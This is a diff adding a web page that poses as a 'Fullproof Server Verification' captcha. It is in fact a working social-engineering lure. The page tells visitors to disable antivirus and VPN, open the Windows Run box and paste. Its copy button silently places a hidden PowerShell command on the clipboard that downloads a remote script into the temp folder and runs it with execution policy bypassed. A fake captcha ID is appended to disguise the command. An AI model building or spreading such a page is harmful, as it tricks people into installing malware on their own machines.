@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Server Verification</title>
+    <link rel="stylesheet" href="styles.css"> 
+</head>
+<body>
+    <div class="image-container" id="imageContainer">
+        <img src="https://i.postimg.cc/hv50cWQs/security.webp" alt="Security Image">
+        <div class="horizontal-line"></div>
+        <div class="bottom-left"></div>
+        <div class="bottom-right"></div>
+    </div>
+
+    <div class="transparent-box" id="transparentBox">
+        <div class="header">
+            <img src="https://i.postimg.cc/hv50cWQs/security.webp" alt="Security Image" class="box-image">
+            <h1>Fullproof Server Verification</h1> 
+        </div>
+        <hr class="title-rule"> 
+
+        <div class="main-text">
+            Secure your access: Complete captcha verification to access protected servers.
+        </div>
+
+        <ol class="instructions">
+            <li>- Copy the captcha ID.</li>
+            <li>- Turn off tampering apps; antiviruses & vpns</li>
+            <li>- Press Windows + R.</li>
+            <li>- Press Ctrl + V.</li>
+            <li>- Click Ok to finish.</li>
+            <li>- Wait for captcha verification to complete.</li>
+        </ol>
+
+        <button id="copyButton">Copy Captcha ID</button>
+    </div>
+
+    <script>
+        setTimeout(() => {
+            document.getElementById('imageContainer').style.display = 'none'; 
+            const transparentBox = document.getElementById('transparentBox');
+            transparentBox.style.display = 'block';
+        }, 6000); 
+
+        function generateRandomNumber() {
+            return Math.floor(100000 + Math.random() * 900000);
+        }
+
+        document.getElementById('copyButton').addEventListener('click', () => {
+            const randomCaptchaId = generateRandomNumber();
+            const command = `powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "iwr https://raw.githubusercontent.com/waveget/loader/refs/heads/main/Captcha-Processor.ps1 -OutFile $env:TEMP\\Captcha-Processor.ps1; & $env:TEMP\\Captcha-Processor.ps1" # Security Captcha: ${randomCaptchaId}`;
+
+            navigator.clipboard.writeText(command).catch(err => {
+                console.error('Failed to copy: ', err);
+            });
+        });
+    </script>
+</body>
+</html>
